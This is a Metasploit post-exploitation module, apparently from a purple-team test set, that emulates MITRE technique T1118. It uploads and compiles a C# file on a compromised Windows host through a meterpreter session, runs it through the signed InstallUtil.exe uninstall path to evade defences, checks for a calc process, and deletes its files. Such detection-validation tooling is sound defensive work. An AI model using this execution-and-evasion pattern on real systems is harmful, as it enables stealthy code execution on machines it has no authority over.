##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple
  include Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'InstallUtil (T1118) Windows - Purple Team',
                      'Description'   => %q{
                        Defense Evasion, Execution:
                        InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. InstallUtil is located in the .NET directories on a Windows system: C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe and C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe. InstallUtil.exe is digitally signed by Microsoft.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1118' ],
                      [ 'URL', 'https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1118' ],
                      [ 'URL', 'https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new( 'RFILE', [false, 'Local path of the HTA that we will write.','C:\\t1118.txt' ]),
      OptInt.new('ARCH', [true, 'Architecture (1=x86,2=x64)',1 ]),
      OptString.new('LFILE', [ true, 'Local path of the file to upload.', ::File.join(Msf::Config.install_root, "data", "purple", "t1118", "t1118.cs") ]),
      OptBool.new('CLEANUP_FILE', [ true, "Clean-up files", true]),
      OptString.new('DOTNET_VERSION', [true, 'DotNet Version','v4.0.30319' ]),
    ])
  end

  def remote_file
    if datastore['RFILE'].blank?
      remote_name = File.basename(datastore['LFILE'])
    else
      remote_name = datastore['RFILE']
    end

    remote_name
  end

  def local_file
    datastore['LFILE']
  end

  def run_installutil()
    rfile = remote_file()
    lfile = local_file()
    dotnet_version = datastore['DOTNET_VERSION']
    arch = datastore['ARCH']

    if arch == 1
      base = 'C:\Windows\Microsoft.NET\Framework'
    else
      base = 'C:\Windows\Microsoft.NET\Framework64'
    end

    csc = base + '\\' + dotnet_version + '\\' + 'csc.exe'
    installutil = base + '\\' + dotnet_version + '\\' + 'installutil.exe'

    upload_file(rfile, lfile)

    tmp = "C:\\t1118.exe"
    select(nil,nil,nil,2)

    cmd = %Q(#{csc} /out:#{tmp} #{rfile})
    print_status("Compiling...")
    run_cmd(cmd)

    cmd = %Q(#{installutil} /logfile= /LogToConsole=false /U #{tmp}")
    print_status("Executing InstallUtil...")
    run_cmd(cmd,false)
    select(nil,nil,nil,1)

    sleep(2)

    print_status("Checking for calc running")

    kill_calc(true)

    if datastore['CLEANUP_FILE']
      print_status("Removing files...")
      register_file_for_cleanup(tmp)
      register_file_for_cleanup(rfile)
    end
  end

  def run
    begin
      return 0 if session.type != "meterpreter"

      unless is_admin?
        fail_with(Failure::NoAccess, "The current session does not have administrative rights.")
      end

      run_installutil()

      print_good("Module T1118 execution successful.")
    rescue ::Exception => e
      print_status("Unable to execute: #{e.message}")
      print_error("Module T1118 execution failed.")
      return
    end
  end
end
